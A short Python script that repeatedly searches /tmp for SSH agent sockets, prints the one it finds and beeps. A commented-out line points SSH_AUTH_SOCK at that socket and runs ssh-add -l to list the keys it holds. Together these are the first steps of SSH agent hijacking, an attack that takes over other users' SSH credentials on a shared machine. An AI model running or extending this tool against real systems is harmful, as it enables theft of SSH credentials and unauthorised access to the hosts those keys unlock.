import subprocess
import time
import os

#find agent
agent = "find /tmp -path '*ssh*' -type s"

#loop continuosly
while True:
	stdout = subprocess.check_output(agent, shell=True)
	if 'agent' in str(stdout, encoding='utf-8'): #clean formatting
		stdout = str(stdout, encoding='utf-8')
		stdout = stdout.rstrip()
		break

	time.sleep(10)

print(stdout)
#exec
#auth = subprocess.check_output(f"export SSH_AUTH_SOCK={stdout};ssh-add -l", shell=True)
#print(auth)

#alert
beep = lambda x: os.system("echo -n '\a';sleep 0.2;" * x)
beep(4)



